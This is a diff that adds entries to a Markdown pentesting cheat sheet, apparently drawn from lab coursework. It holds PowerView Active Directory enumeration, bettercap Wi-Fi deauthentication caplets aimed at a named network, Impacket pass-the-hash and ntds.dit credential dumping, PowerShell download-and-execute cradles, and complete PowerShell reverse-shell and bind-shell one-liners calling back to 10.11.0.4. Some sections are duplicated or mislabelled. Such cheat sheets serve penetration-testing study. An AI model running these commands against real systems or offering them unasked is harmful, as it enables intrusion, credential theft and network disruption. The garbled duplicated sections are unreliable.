@@ -560,9 +560,17 @@ cd cheatsheet-pentesting
 ---
 
 ### Powerview
+- **Installing and Importing PowerView**:
+  ```powershell
+  Import-Module .\PowerView.ps1
+
+  ```
 - **List Domain Admins**:
   ```powershell
   Get-DomainAdmin
+  Get-DomainGroupMember -Identity "Domain Admins"
+  Get-DomainGroup | select name, member
+
   ```
 
 - **Enumerate All Group Memberships**:
@@ -574,7 +582,38 @@ cd cheatsheet-pentesting
   ```powershell
   Get-NetLocalGroupMember -Group "Administrators" -Computer <target-computer>
   ```
+- **Enumerating Logged-In Users**:
+  ```powershell
+  Get-NetLoggedon -ComputerName client251
+  Get-NetSession -ComputerName dc01
 
+  ```
+- **Enumerating Computers in the Domain**:
+  ```powershell
+  Get-DomainComputer | select samaccountname, name
+
+  ```
+- **Enumerating Domain Users**:
+  ```powershell
+  Get-DomainUser | select memberof, name
+
+  ```
+- **Recursively list all members, including nested groups:**:
+  ```powershell
+  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+
+  ```
+- **Group Policy Enumeration**:
+  ```powershell
+  Get-NetGPO
+  Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName tester
+
+  ```
+- **Hunting for Active Domain Admin Sessions**:
+  ```powershell
+  Invoke-UserHunter -CheckAccess
+
+  ```
 ---
 
 ### PrivescCheck
@@ -728,13 +767,117 @@ cd cheatsheet-pentesting
 - **Start Sniffing on Interface**:
   ```bash
   bettercap -iface <interface> -caplet http-server
+  sudo bettercap -iface wlan0
   ```
 
 - **Enable HTTP Proxy**:
   ```bash
   bettercap -iface <interface> -proxy
   ```
+- **Wi-Fi Reconnaissance**:
+  ```bash
+  wlan0 » wifi.recon on
+  wlan0 » wifi.recon.channel 6,11
+  wlan0 » wifi.show
 
+  ```
+
+- **Use Ticker to Continuously Display Data:**:
+  ```bash
+  wlan0 » set ticker.commands "clear; wifi.show"
+  wlan0 » wifi.recon on
+  wlan0 » ticker on
+
+  ```
+- **Automate Commands at Startup:**:
+  ```bash
+  sudo bettercap -iface wlan0 -eval "set ticker.commands 'clear; wifi.show'; wifi.recon on; ticker on"
+
+  ```
+
+- **Filtering and Targeting**:
+  ```bash
+  wlan0 » wifi.recon c6:2d:56:2a:53:f8
+  wlan0 » wifi.show
+  wlan0 » set wifi.show.filter ^c0
+  wlan0 » wifi.show
+
+
+  ```
+- **Reset Filters and Set RSSI Threshold:**:
+  ```bash
+  wlan0 » set wifi.show.filter ""
+  wlan0 » set wifi.rssi.min -49
+  wlan0 » wifi.show
+
+  ```
+
+- **Deauthentication Attacks**:
+  ```bash
+  wlan0 » wifi.deauth c6:2d:56:2a:53:f8
+
+  ```
+- **Handling Handshakes**:
+  ```bash
+  wlan1 » wifi.recon off
+  wlan1 » get wifi.handshakes.file 
+  wlan0 » set wifi.handshakes.file "/home/kali/handshakes/"
+  wlan0 » set wifi.handshakes.aggregate false
+  wlan0 » wifi.recon on
+
+  ```
+
+- **Capture Handshake:**:
+  ```bash
+  wlan0 » wifi.deauth c6:2d:56:2a:53:f8
+  -> Corporate (c6:2d:56:2a:53:f8) WPA2 handshake (full) to /home/kali/handshakes/Corporate_405d82dcb210.pcap
+
+  ```
+- **Skipping Specific BSSIDs**:
+  ```bash
+  wlan0 » set wifi.deauth.skip ac:22:0b:28:fd:22
+  wlan0 » wifi.deauth c6:2d:56:2a:53:f8
+
+  ```
+
+- **Automating Deauthentication Using Caplets**:
+  ```bash
+  kali@kali:/usr/share/bettercap/caplets$ cat -n massdeauth.cap
+  set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}
+
+  ```
+- **Custom Deauthentication Caplet for "Corporate":**:
+  ```bash
+  bettercap -iface <interface> -caplet http-server
+  ```
+
+- **Enable HTTP Proxy**:
+  ```bash
+  bettercap -iface <interface> -proxy
+  ```
+- **Start Sniffing on Interface**:
+  ```bash
+  kali@kali:~$ cat -n deauth_corp.cap 
+  1  set $ {br}{fw}{net.received.human} - {env.iface.name}{reset} » {reset}
+  2
+  3  set ticker.period 10
+  4  set ticker.commands clear; wifi.show; events.show; wifi.deauth c6:2d:56:2a:53:f8
+  5
+  6  events.ignore wifi.ap.new
+  7  events.ignore wifi.client.probe
+  8  events.ignore wifi.client.new
+  9
+  10  wifi.recon on
+  11  ticker on
+  12  events.clear
+  13  clear
+
+  ```
+
+- **Run the Custom Caplet:**:
+  ```bash
+  sudo bettercap -iface wlan0 -caplet deauth_corp.cap
+  ```
 ---
 
 ### bloodHound
@@ -1713,6 +1856,28 @@ cd cheatsheet-pentesting
 - **Run SMB Server**:
   ```bash
   impacket-smbserver <share_name> <share_path>
+  /usr/bin/impacket-smbserver tmpname /tmp/ -smb2support
+  /usr/bin/impacket-smbserver tmpname $(pwd) -smb2support
+  ```
+
+- **Execute Remote Command**:
+  ```bash
+  impacket-psexec <target_ip> -u <username> -p <password> <command>
+  impacket-psexec username:password@127.0.0.1
+  impacket-psexec -hashes aad3b435b514ddddd35b51404ee:d4bf5a8dddddd5b8dbb60859746 tester@10.11.1.73
+  ```
+- **Dumping Domain User Hashes from ntds.dit**:
+  ```bash
+  impacket-secretsdump -ntds "Active Directory/ntds.dit" -system registry/SYSTEM LOCAL
+  ```
+
+- **MSSQLClient for SQL Exploitation**:
+  ```bash
+  /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:password@10.129.255.88 -windows-auth
+  ```
+- **Run SMB Server**:
+  ```bash
+  impacket-smbserver <share_name> <share_path>
   ```
 
 - **Execute Remote Command**:
@@ -1863,6 +2028,11 @@ cd cheatsheet-pentesting
 
 ---
 ### Kerberoast
+- **Installing Kerberoast**:
+  ```bash
+  sudo apt update && sudo apt install kerberoast
+  ```
+
 - **Request a Service Ticket**:
   ```bash
   GetUserSPNs.py -request -dc-ip <domain_controller_ip> <domain>/<username>
@@ -2512,9 +2682,104 @@ cd cheatsheet-pentesting
   ```
 - **Download Tools(Powercat) using PowerShell**:
   ```powershell
+  powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
   iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+  powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/whoami.exe', 'C:\Users\Public\whoami.exe')
+
   ```
   iex executes the downloaded PowerShell script.
+- **Run a Script**:
+  ```powershell
+  powershell -File <script.ps1>
+  ```
+- **PowerShell Execution Policy**:
+  ```powershell
+  Set-ExecutionPolicy Unrestricted
+  Get-ExecutionPolicy
+  ```
+- **Remote PowerShell Sessions**:
+  ```powershell
+  $dcsesh = New-PSSession -Computer SANDBOXDC
+  Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}
+  ```
+- **File Transfers**:
+  ```powershell
+  Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
+  ```
+- **Reverse Shell One-Liner**:
+  ```powershell
+  powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+  ```
+- **Persistent Reverse Shell**:
+  ```powershell
+  $client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
+  $stream = $client.GetStream();
+  [byte[]]$bytes = 0..65535|%{0};
+  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+  {
+      $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+      $sendback = (iex $data 2>&1 | Out-String );
+      $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+      $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+      $stream.Write($sendbyte,0,$sendbyte.Length);
+      $stream.Flush();
+  }
+  $client.Close();
+  ```
+- **Bind Shell**:
+  ```powershell
+  powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
+  ```
+- **File Extraction and Archive Handling**:
+  ```powershell
+  Expand-Archive -Path .\PSTools.zip -DestinationPath C:\Windows\System32\
+  ```
+- **PowerShell Enumeration**:
+  ```powershell
+  echo $PSVersionTable
+  Get-Command -Noun file
+  Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status
+  Get-Service | Get-Member
+  Get-Service | Select-Object -Property "DisplayName","MachineName","ServiceType","StartType","Status"
+  Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending
+  Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object StartType -EQ Automatic
+  Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object StartType -EQ Automatic | Format-List
+  Get-Service | Select-Object -Property ServiceName,DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object {$_.StartType -EQ "Automatic" -And $_.ServiceName -Match "^s"}
+  Get-Service | Select-Object -Property ServiceName,DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object {$_.StartType -EQ "Automatic" -And $_.ServiceName -Match "^s"} | Format-Table
+
+  ```
+- **PowerShell Remote Access**:
+  ```powershell
+  Enable-PSRemoting
+  Invoke-Command -ComputerName 192.168.50.80 -ScriptBlock { ipconfig } -Credential offensive
+
+  ```
+- **Set Trusted Hosts**:
+  ```powershell
+  Set-Item wsman:\localhost\client\trustedhosts 192.168.50.80
+
+  ```
+- **Run a new cmd.exe process with elevated privileges**:
+  ```powershell
+  powershell.exe Start-Process cmd.exe -Verb runAs
+
+  ```
+- **Execute a script:**:
+  ```powershell
+  powershell.exe -exec bypass C:\Users\vandelay\Desktop\computerInfo.ps1
+
+  ```
+- **Miscellaneous PowerShell Commands**:
+  ```powershell
+  Get-Verb
+  Get-Help Get-Help
+  Get-Alias
+  Get-Module -ListAvailable
+  Get-Help Start-MpScan
+  Start-MpScan -ScanPath 'C:\\Users\\User\\' -ScanType QuickScan
+
+  ```
+
 ---
 ### PsExec
 - **Execute a Command on a Remote Host**:
@@ -2560,6 +2825,24 @@ cd cheatsheet-pentesting
   pth-winexe -U tester%aad3b435b5dsdfsdfb435b51404ee:2892d26csdfdsfb9f05c425e //10.11.0.22 cmd
   ```
 ### Python
+- **Run a Python Script**:
+  ```bash
+  python <script.py>
+  ```
+
+- **Start Python Interactive Shell**:
+  ```bash
+  python
+  ```
+- **Run a Python Script**:
+  ```bash
+  python <script.py>
+  ```
+
+- **Start Python Interactive Shell**:
+  ```bash
+  python
+  ```
 - **Run a Python Script**:
   ```bash
   python <script.py>
